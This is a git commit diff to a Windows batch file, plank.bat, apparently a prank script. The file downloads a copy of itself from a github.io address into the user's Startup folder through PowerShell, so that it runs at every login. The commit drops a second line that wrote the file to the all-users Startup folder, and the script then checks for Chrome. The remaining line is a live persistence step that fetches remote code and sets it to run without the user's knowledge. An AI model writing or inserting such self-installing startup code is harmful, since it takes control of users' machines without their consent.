7ebb4bb1b767993c31ed75f87e4a889329761f88
giggityfiles <giggityfiles@gmail.com>
2025-10-17 22:27:12 -0400

    geg

--- plank.bat
+++ plank.bat
@@ -1,12 +1,10 @@
 @echo off
 set "programdta=C:\ProgramData"
-set "allstartup=%programdta%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "URL=https://cmd-hue.github.io/plank/"
 
 
 
-powershell -Command "Invoke-WebRequest -Uri 'https://cmd-hue.github.io/plank.bat' -OutFile '%allstartup%'"
 powershell -Command "Invoke-WebRequest -Uri 'https://cmd-hue.github.io/plank.bat' -OutFile '%startup%'"
 
 where chrome >nul 2>nul
